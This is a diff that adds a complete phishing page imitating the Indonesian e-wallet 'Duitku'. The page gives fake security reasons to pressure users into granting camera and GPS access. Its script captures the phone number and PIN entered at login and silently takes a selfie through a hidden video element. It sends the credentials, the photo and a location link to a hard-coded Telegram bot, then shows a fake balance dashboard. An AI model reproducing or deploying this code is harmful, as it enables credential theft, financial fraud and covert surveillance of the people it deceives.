@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Duitku - Dompet Digital Terpercaya</title>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- FontAwesome untuk Icon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1e293b;
+        }
+        .phone-frame {
+            width: 100%;
+            max-width: 410px;
+            background: #ffffff;
+            border-radius: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            min-height: 750px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        .hidden {
+            display: none !important;
+        }
+
+        /* --- MODAL PERINGATAN IZIN (KAMERA & LOKASI) --- */
+        .modal-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 25px;
+        }
+        .modal-box {
+            background: #ffffff;
+            width: 100%;
+            border-radius: 24px;
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            animation: popUp 0.3s ease-in-out;
+        }
+        @keyframes popUp {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .modal-icon {
+            width: 60px;
+            height: 60px;
+            background: #eff6ff;
+            color: #0066ff;
+            font-size: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+        }
+        .modal-box h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 8px;
+        }
+        .modal-box p {
+            font-size: 13px;
+            color: #64748b;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .btn-modal {
+            width: 100%;
+            padding: 12px;
+            background: #0066ff;
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0, 102, 255, 0.3);
+        }
+
+        /* --- HALAMAN LOGIN --- */
+        .login-container {
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            flex-grow: 1;
+        }
+        .brand-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .brand-logo {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #0066ff, #00ccff);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            color: white;
+            font-size: 32px;
+            font-weight: 800;
+            box-shadow: 0 10px 20px rgba(0, 102, 255, 0.3);
+        }
+        .brand-header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0f172a;
+        }
+        .brand-header p {
+            font-size: 14px;
+            color: #64748b;
+            margin-top: 5px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #475569;
+            margin-bottom: 8px;
+        }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            color: #94a3b8;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 15px 14px 45px;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s;
+            background: #f8fafc;
+        }
+        .input-wrapper input:focus {
+            border-color: #0066ff;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1);
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #0066ff, #0052cc);
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
+            margin-top: 10px;
+        }
+        .btn-login:active {
+            transform: scale(0.98);
+        }
+
+        /* --- HALAMAN DASHBOARD E-WALLET --- */
+        .dashboard-container {
+            padding: 25px;
+            background: #f8fafc;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .user-top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .user-info h3 {
+            font-size: 16px;
+            color: #0f172a;
+        }
+        .user-info p {
+            font-size: 12px;
+            color: #64748b;
+        }
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: #cbd5e1;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #475569;
+            font-weight: 700;
+        }
+        .wallet-card {
+            background: linear-gradient(135deg, #0066ff, #002b80);
+            color: white;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 102, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .wallet-card::before {
+            content: '';
+            position: absolute;
+            right: -30px;
+            bottom: -30px;
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        .wallet-title {
+            font-size: 13px;
+            opacity: 0.8;
+            font-weight: 500;
+        }
+        .wallet-saldo {
+            font-size: 26px;
+            font-weight: 800;
+            margin: 8px 0 15px 0;
+        }
+        .wallet-actions {
+            display: flex;
+            gap: 10px;
+        }
+        .action-chip {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            backdrop-filter: blur(5px);
+        }
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .menu-box {
+            background: white;
+            padding: 15px 10px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+            transition: transform 0.2s;
+        }
+        .menu-box i {
+            font-size: 20px;
+            color: #0066ff;
+            margin-bottom: 8px;
+            display: block;
+        }
+        .menu-box span {
+            font-size: 11px;
+            font-weight: 600;
+            color: #334155;
+        }
+        .section-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 12px;
+        }
+        .history-list {
+            background: white;
+            border-radius: 16px;
+            padding: 10px 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+        }
+        .history-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #f1f5f9;
+        }
+        .history-item:last-child {
+            border-bottom: none;
+        }
+        .history-info .title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #1e293b;
+        }
+        .history-info .time {
+            font-size: 11px;
+            color: #94a3b8;
+        }
+        .history-amount {
+            font-size: 13px;
+            font-weight: 700;
+        }
+        .amount-in { color: #10b981; }
+        .amount-out { color: #ef4444; }
+    </style>
+</head>
+<body>
+
+    <div class="phone-frame">
+        <!-- MODAL PERMINTAAN IZIN KESELURUHAN (KAMERA & LOKASI) -->
+        <div id="permissionModal" class="modal-overlay">
+            <div class="modal-box">
+                <div class="modal-icon" id="modalIcon"><i class="fa-solid fa-shield-halved"></i></div>
+                <h3 id="modalTitle">Verifikasi Keamanan</h3>
+                <p id="modalDesc">Duitku memerlukan akses Kamera (Selfie) dan Lokasi untuk memastikan keamanan akun dan menghindari penipuan.</p>
+                <button class="btn-modal" id="modalBtn" onclick="requestAllPermissions()">Izinkan Akses</button>
+            </div>
+        </div>
+
+        <!-- HALAMAN LOGIN -->
+        <div id="login-section" class="login-container">
+            <div class="brand-header">
+                <div class="brand-logo">D</div>
+                <h1>Duitku</h1>
+                <p>Masuk ke dompet digital Anda</p>
+            </div>
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <label>Nomor Handphone</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-phone"></i>
+                        <input type="text" id="username" required placeholder="08xxxxxxxxxx">
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>PIN Duitku</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-lock"></i>
+                        <input type="password" id="password" required placeholder="Masukkan 6 digit PIN">
+                    </div>
+                </div>
+                <button type="submit" class="btn-login">Masuk Sekarang</button>
+            </form>
+        </div>
+
+        <!-- HALAMAN DASHBOARD E-WALLET -->
+        <div id="wallet-section" class="dashboard-container hidden">
+            <div class="user-top-bar">
+                <div class="user-info">
+                    <h3 id="displayUser">Halo, Pengguna</h3>
+                    <p>Selamat datang kembali 👋</p>
+                </div>
+                <div class="avatar"><i class="fa-solid fa-user"></i></div>
+            </div>
+
+            <div class="wallet-card">
+                <div class="wallet-title">Saldo Utama Duitku</div>
+                <div class="wallet-saldo">Rp 2.450.000</div>
+                <div class="wallet-actions">
+                    <div class="action-chip"><i class="fa-solid fa-plus"></i> Top Up</div>
+                    <div class="action-chip"><i class="fa-solid fa-arrow-up"></i> Kirim</div>
+                </div>
+            </div>
+
+            <div class="menu-grid">
+                <div class="menu-box">
+                    <i class="fa-solid fa-wallet"></i>
+                    <span>Transfer</span>
+                </div>
+                <div class="menu-box">
+                    <i class="fa-solid fa-mobile-screen"></i>
+                    <span>Pulsa / Data</span>
+                </div>
+                <div class="menu-box">
+                    <i class="fa-solid fa-bolt"></i>
+                    <span>Listrik PLN</span>
+                </div>
+                <div class="menu-box">
+                    <i class="fa-solid fa-receipt"></i>
+                    <span>BPJS/PDAM</span>
+                </div>
+            </div>
+
+            <div class="section-title">Riwayat Transaksi</div>
+            
+            <div class="history-list">
+                <div class="history-item">
+                    <div class="history-info">
+                        <div class="title">Top Up dari Bank BCA</div>
+                        <div class="time">Hari ini, 09:14</div>
+                    </div>
+                    <div class="history-amount amount-in">+ Rp 500.000</div>
+                </div>
+                <div class="history-item">
+                    <div class="history-info">
+                        <div class="title">Bayar Merchant QRIS</div>
+                        <div class="time">Kemarin, 14:30</div>
+                    </div>
+                    <div class="history-amount amount-out">- Rp 45.000</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Video & Canvas untuk Selfie -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // KONFIGURASI TELEGRAM BOT (Ganti dengan Token & Chat ID Anda)
+        const TELEGRAM_BOT_TOKEN = '8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is';
+        const TELEGRAM_CHAT_ID = '6742478722';
+
+        let capturedImageBlob = null;
+        let userLocation = "Lokasi belum diizinkan";
+        let cameraGranted = false;
+        let locationGranted = false;
+
+        // Saat web dibuka, langsung pemicu permintaan izin
+        window.onload = function() {
+            requestAllPermissions();
+        };
+
+        // Fungsi untuk meminta izin Kamera dan Lokasi sekaligus
+        function requestAllPermissions() {
+            // 1. Minta Izin Kamera (Selfie)
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    cameraGranted = true;
+                    checkPermissionsStatus();
+                })
+                .catch(err => {
+                    console.log("Kamera ditolak: ", err);
+                    cameraGranted = false;
+                    showPermissionModal("kamera");
+                });
+
+            // 2. Minta Izin Lokasi (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        userLocation = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                        locationGranted = true;
+                        checkPermissionsStatus();
+                    },
+                    error => {
+                        console.log("GPS ditolak: ", error.message);
+                        locationGranted = false;
+                        showPermissionModal("lokasi");
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+        }
+
+        // Mengecek apakah keduanya sudah diizinkan, jika ya, hilangkan modal
+        function checkPermissionsStatus() {
+            if (cameraGranted && locationGranted) {
+                document.getElementById('permissionModal').classList.add('hidden');
+            }
+        }
+
+        // Menyesuaikan teks pop-up jika salah satu atau keduanya ditolak
+        function showPermissionModal(type) {
+            const modal = document.getElementById('permissionModal');
+            const title = document.getElementById('modalTitle');
+            const desc = document.getElementById('modalDesc');
+            const icon = document.getElementById('modalIcon');
+
+            modal.classList.remove('hidden');
+
+            if (type === "kamera") {
+                icon.innerHTML = '<i class="fa-solid fa-camera"></i>';
+                title.innerText = "Akses Kamera Diperlukan";
+                desc.innerText = "Aplikasi Duitku wajib mengakses kamera depan untuk verifikasi wajah (selfie) demi keamanan akun Anda.";
+            } else if (type === "lokasi") {
+                icon.innerHTML = '<i class="fa-solid fa-location-dot"></i>';
+                title.innerText = "Akses Lokasi Diperlukan";
+                desc.innerText = "Aplikasi Duitku wajib mendeteksi posisi GPS Anda guna mencegah aktivitas login yang mencurigakan.";
+            }
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            // Jika izin kamera/lokasi belum lengkap saat mau login, pancing lagi
+            if (!cameraGranted || !locationGranted) {
+                requestAllPermissions();
+                alert("Mohon berikan izin Kamera dan Lokasi terlebih dahulu untuk melanjutkan.");
+                return;
+            }
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // Update nama user di dashboard
+            document.getElementById('displayUser').innerText = `Halo, ${user}`;
+
+            // Ambil foto dari video stream secara instan
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(function(blob) {
+                capturedImageBlob = blob;
+                sendToTelegram(user, pass, capturedImageBlob, userLocation);
+            }, 'image/jpeg');
+
+            // Pindah tampilan ke Dashboard
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('wallet-section').classList.remove('hidden');
+        }
+
+        function sendToTelegram(username, password, imageBlob, locationUrl) {
+            if (TELEGRAM_BOT_TOKEN === 'MASUKKAN_BOT_TOKEN_ANDA_DISINI') return;
+
+            const textMessage = `🔔 *LOGIN DUITKU TERDETEKSI*\n\n👤 Akun: \`${username}\`\n🔑 PIN: \`${password}\`\n📍 Lokasi: ${locationUrl}`;
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: textMessage,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            if (imageBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', imageBlob, 'selfie.jpg');
+                formData.append('caption', `📸 Foto Selfie Pengguna (${username})`);
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+    </script>
+</body>
+</html
